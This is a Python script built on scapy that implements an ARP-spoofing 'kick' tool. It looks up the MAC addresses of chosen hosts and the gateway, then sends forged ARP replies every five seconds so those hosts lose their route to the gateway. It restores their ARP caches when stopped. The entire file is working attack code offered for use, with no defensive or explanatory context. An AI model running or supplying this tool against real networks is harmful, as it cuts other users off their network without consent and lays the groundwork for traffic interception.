from scapy.all import *
import time

def get_mac(ip):
    try:
        arp_packet = ARP(pdst = ip)
        broadcast_packet = Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_to_broadcast = broadcast_packet / arp_packet
        answered_list = srp(arp_to_broadcast, timeout = 5, verbose = False)[0]
        return answered_list[0][1].hwsrc
    except Exception:
        return None



def poison_host(target_ip, gateway_to_change, target_mac):
    try:
        packet = ARP(op = 2, pdst = target_ip, 
                        hwdst = target_mac, 
                        psrc = gateway_to_change)

        send(packet, verbose = False)
        return True

    except Exception:
        return False

    

def restore(target_ip, gateway_to_change, target_mac, gateway_mac):
        try:
            packet = ARP(op = 2, pdst = target_ip, 
                            hwdst = target_mac, 
                            psrc = gateway_to_change,
                            hwsrc = gateway_mac)
            send(packet, verbose = False)
            return True

        except Exception:
            return False

def kick_hosts(hosts, gateway):
    try:
        hosts_macs = [get_mac(host) for host in hosts]

        gateway_mac = get_mac(gateway)

        if not gateway_mac:
            print("Can't find gateway's mac address")
            exit()

        print("Starting to kick...\n Press cntrl+c to stop")
        while True:
            for i, host in enumerate(hosts):
                poison_host(host, gateway, hosts_macs[i])
            time.sleep(5)

    except KeyboardInterrupt:
        for i, host in enumerate(hosts):
            restore(host, gateway, hosts_macs[i] ,gateway_mac)
        print("Stopped...")